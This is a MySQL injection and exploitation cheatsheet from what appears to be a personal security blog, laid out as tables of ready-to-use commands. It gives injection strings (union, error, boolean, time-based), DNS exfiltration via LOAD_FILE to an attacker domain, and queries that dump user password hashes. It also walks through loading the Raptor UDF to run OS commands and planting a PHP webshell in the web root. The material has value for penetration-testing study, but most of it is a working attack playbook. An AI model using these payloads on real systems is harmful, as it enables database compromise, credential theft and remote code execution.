---
title:  "MySQL Cheatsheet"
imgdir: 
tags: web sql
excerpt: Cheatsheet for MySQL
date: 2021-11-06
---


add where not in

Note: the segments enclosed in double carets (^^) need to be replaced with the indicated value - examples have been provided where practical.
{: .notice--info}

# MySQL Injection

## Union Based
[ftb](/articles/owasp10/SQLi/#union-based)

| Function | Command | Ref. |
| --- | --- |---|
| Column Count by ORDER | `ORDER BY ^^column_id^^;`{:.language-sql .highlight}<br>eg.`ORDER BY 1;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/sorting-rows.html) |
| Column Count by GROUP | `GROUP BY ^^column_id^^;`{:.language-sql .highlight}<br>eg.`GROUP BY 1;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/group-by-handling.html) |
| Get Returned Columns | `UNION ALL SELECT 1,2,3;`{:.language-sql .highlight} (incrementing up to column count) | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/union.html) |
|===|===|===|


## Error based

[ftb](/articles/owasp10/SQLi/#error-based)

| Function | Command | Ref. |
| --- | --- |---|
| Trigger error on query | `ExtractValue(rand(),concat(0x3a,^^query^^));`{:.language-sql .highlight}<br>eg.`ExtractValue(rand(),concat(0x3a,version()));`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_extractvalue) |
|===|===|===|

## Blind - Boolean based

[ftb](/articles/owasp10/SQLi/#boolean-based)

| Function | Command | Ref. |
| --- | --- |---|
| Testing True | `OR '1'='1';`{:.language-sql .highlight} |  |
|  | `AND '1'='1';`{:.language-sql .highlight} |  |
| Testing False | `OR '1'='0';`{:.language-sql .highlight} |  |
|  | `AND '1'='0';`{:.language-sql .highlight} |  |
| Binary character discovery | `AND SUBSTRING((SELECT username FROM users WHERE id = 1), 1, 1) > 'm';`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_substring) |
|===|===|===|


## Blind - Time based

[ftb](/articles/owasp10/SQLi/#time-based)

| Function | Command | Ref. |
| --- | --- |---|
| IF query (10sec) | `IF((^^boolean query^^), sleep(10), NULL );';`{:.language-sql .highlight}|  |
|===|===|===|


## Out of Band - DNS

[ftb](/articles/owasp10/SQLi/#dns-exfiltration)

| Function | Command | Ref. |
| --- | --- |---|
| Test DNS query | `SELECT LOAD_FILE('\\\\^^attackerdomain^^\\x.txt');`{:.language-sql .highlight}<br>eg. `SELECT LOAD_FILE('\\\\domain.com\\x.txt');`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) |
| DNS Exfiltration | `SELECT LOAD_FILE(CONCAT('\\\\',^^query^^,'.^^attackerdomain^^\\x.txt'));`{:.language-sql .highlight}<br>eg. `SELECT LOAD_FILE(CONCAT('\\\\',CURRENT_USER(),'.domain.com\\x.txt'));`{:.language-sql .highlight} |
|===|===|===|

# MySQL Commands

## General

| Function | Command | Ref. |
| --- | --- | --- |
| Block Comment | `/*comment is here (can spread multiple lines)*/`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/comments.html) |
| Comment | `-- comment here, can go at end of line or it's own line`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/comments.html) |
| Comment | `# comment here, can go at end of line or it's own line`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/comments.html) |
| SELECT | `SELECT ^^column^^ FROM ^^table^^;`{:.language-sql .highlight}<br>eg.`SELECT username FROM users;`{:.language-sql .highlight}  | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/select.html) |
| WHERE | `SELECT ^^column^^ FROM ^^table^^ WHERE ^^condition^^;`{:.language-sql .highlight}<br>eg.`SELECT password FROM users WHERE username='admin';`{:.language-sql .highlight}  | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/select.html) |
| WHERE IN | `SELECT ^^column^^ FROM ^^table^^ WHERE ^^column^^ IN (^^array^^);`{:.language-sql .highlight}<br>eg.`SELECT password FROM users WHERE username IN ('admin','jim','jerry');`{:.language-sql .highlight}  | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/select.html) |
| WHERE NOT IN <br>(useful if not all results visible) | `SELECT ^^column^^ FROM ^^table^^ WHERE ^^column^^ NOT IN (^^array^^);`{:.language-sql .highlight}<br>eg.`SELECT password FROM users WHERE username NOT IN ('tim','clarence','linda');`{:.language-sql .highlight}  | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/select.html) |
|===|===|===|

## User Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get SQL User | `SELECT USER()`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html) |
| | `SELECT SYSTEM_USER()`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html) |
| | `SELECT CURRENT_USER()`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html) |
| | `SELECT SESSION_USER()`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html) |
| Get Users | `SELECT User, Host FROM mysql.user;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db) |
| Get Password hash (<5.6) | `SELECT User, Password FROM mysql.user`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/5.6/en/grant-tables.html) |
| Get Password hash | `SELECT User, authentication_string FROM mysql.user`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db) |
|===|===|===|

## Privilege Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| List User Privs | `SELECT GRANTEE, PRIVILEGE_TYPE, IS_GRANTABLE FROM INFORMATION_SCHEMA.USER_PRIVILEGES;`{:.language-sql .highlight} |[MySQL](https://dev.mysql.com/doc/refman/5.6/en/information-schema-user-privileges-table.html) |
| | `SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db) |
| List DB Privs | `SELECT GRANTEE, TABLE_SCHEMA, PRIVILEGE_TYPE, IS_GRANTABLE FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES;`{:.language-sql .highlight} |[MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schema-privileges-table.html) |
| | `SELECT Host, Db, User, Select_priv, Insert_priv, Update_priv, Delete_priv, Index_priv, Alter_priv, Create_priv, Drop_priv, Grant_priv, Create_view_priv, Show_view_priv, Create_routine_priv, Alter_routine_priv, Execute_priv, Trigger_priv, Event_priv, Create_tmp_table_priv, Lock_tables_priv, References_priv;`{:.language-sql .highlight} |[MySQL](https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db) |
| List Table Privs | `SELECT GRANTEE, TABLE_SCHEMA, TABLE_NAME, PRIVILEGE_TYPE, IS_GRANTABLE FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-table-privileges-table.html)|
| | `SELECT Host, Db, User, Table_name, Table_priv, Column_priv, Grantor FROM mysql.tables_priv;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-tables-priv-columns-priv) | 
| List Column Privs | `SELECT GRANTEE, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, PRIVILEGE_TYPE, IS_GRANTABLE FROM INFORMATION_SCHEMA.COLUMN_PRIVILEGES;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-column-privileges-table.html) |
| | `SELECT Host, Db, User, Table_name, Column_name, Column_priv;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-tables-priv-columns-priv) |
|===|===|===|

## Server Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get Version | `SELECT @@version, @@version_comment;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) |
| | `SELECT VERSION();`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_version) |
| | `SELECT sys.version_major(), sys.version_minor(), sys.version_patch();`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/sys-schema-functions.html)
| | `SELECT * FROM sys.version;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/5.7/en/sys-schema-usage.html) |
| | `SELECT @@hostname;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) |
| Get Data Directory | `SELECT @@datadir;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) |
| Get log path | `SELECT @@general_log_file;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) |
| Get Plugin Dir | `SELECT @@plugin_dir;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) |
| Get Server Port | `SELECT @@port;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) |
|===|===|===|

## Database Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get Database Name | `SELECT DATABASE();`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_database) |
| Get Databases | `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) |
| | `SHOW DATABASES;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/show-databases.html) |
| | `SELECT DISTINCT(db) FROM mysql.db;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schema-privileges-table.html) |
|===|===|===|

## Table Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get Tables | `SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA NOT IN ('^^known tables array^^');`{:.language-sql .highlight}<br>eg. `SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA NOT IN ('mysql', 'performance_schema', 'information_schema');`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) |
|  | `SHOW TABLES;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/show-tables.html) |
|===|===|===|

## Column Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get Table Columns | `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '^^table name^^';`{:.language-sql .highlight}<br>eg. `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Users';`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) |
|  | `SHOW COLUMNS FROM ^^table name^^;`{:.language-sql .highlight}<br>eg. `SHOW COLUMNS FROM users;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/show-columns.html) |
| Get Table Columns & Type | `SELECT COLUMN_NAME, COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '^^table name^^';`{:.language-sql .highlight}<br>eg. `SELECT COLUMN_NAME, COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Users';`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) |
|===|===|===|

## Data Gathering

| Function | Command | Ref. |
| --- | --- | --- |
| Get Values | `SELECT ^^column name^^ FROM ^^table name^^;`{:.language-sql .highlight}<br>eg.`SELECT password FROM users;`{:.language-sql .highlight} | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/select.html) |
| Get conditional | `SELECT ^^column name^^ FROM ^^table name^^ WHERE ^^column name^^ = '^^value^^';`{:.language-sql .highlight}<br>eg.`SELECT password FROM users WHERE username = 'admin';`{:.language-sql .highlight}|
|===|===|===|

# OS Command Execution

## Raptor UDF

Code Execution via MySQL is available through the ability to load a User Defined Function (UDF). This is available at [exploit-db](https://www.exploit-db.com/exploits/1518) with the key steps outlined below.

Note: This section is to be completed in bash shell on attacking machine. Compilation arguments may vary dependant on target.
{: .notice--info}

### UDF Compilation

| Function | Command | Ref. |
|---|---|---|
| Download Source code | `searchsploit -m 1518`{:.language-bash .highlight} |
| Compile code | `gcc -g -c 1518.c`{:.language-bash .highlight}<br>`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o -lc`{:.language-bash .highlight} |
|===|===|===|


The so file then needs to be transferred to the target host.

Note: This section contains SQL commands to be run on the target.
{: .notice--info}

### Staging UDF

| Function | Command | Ref. |
|---|---|---|
| Create a table to store UDF | `CREATE TABLE foo(line blob);`{:.language-sql .highlight} |
| Load UDF into table | `INSERT INTO foo VALUES(LOAD_FILE('^^path to udf^^'));`{:.language-sql .highlight}<br>eg. `INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor2_udf.so'));`{:.language-sql .highlight} |
| Check plugin directory | `SELECT @@plugin_dir;`{:.language-sql .highlight}|
| Dump UDF into plugin directory | `SELECT * FROM foo INTO DUMPFILE '^^plugindir/so name^^';`{:.language-sql .highlight}<br>eg. `SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';`{:.language-sql .highlight} |
|===|===|===|


### Executing Code

| Function | Command | Ref. |
|---|---|---|
| Load function | `CREATE FUNCTION do_system RETURNS INTEGER SONAME '^^so name^^';`{:.language-sql .highlight}<br>eg. `CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor2_udf.so';`{:.language-sql .highlight}|
| Code Execution | `SELECT do_system('^^shell command^^');`{:.language-sql .highlight}<br>eg. `SELECT do_system('id');`{:.language-sql .highlight} |
|===|===|===|


## Webshell

If the target system is running a webserver, it may be possible to use MySQL to create a webshell file in a directory being served by the webserver.

| Function | Command | Ref. |
|---|---|---|
| Create shell file | `SELECT  "<?php system($_GET['cmd']); ?>" INTO DUMPFILE "^^destination path^^";`{:.language-sql .highlight}<br>eg. `SELECT  "<?php system($_GET['cmd']); ?>" INTO DUMPFILE "/var/www/html/shell.php";`{:.language-sql .highlight} | |
| Create shell file (alt.) | `SELECT 1 LIMIT 1 INTO OUTFILE "^^destination path^^" LINES TERMINATED BY "<?php system($_GET['cmd']); ?>";`{:.language-sql .highlight}<br>eg. `SELECT 1 LIMIT 1 INTO OUTFILE "/var/www/html/shell.php" LINES TERMINATED BY "<?php system($_GET['cmd']); ?>";`{:.language-sql .highlight} | |
|===|===|===|
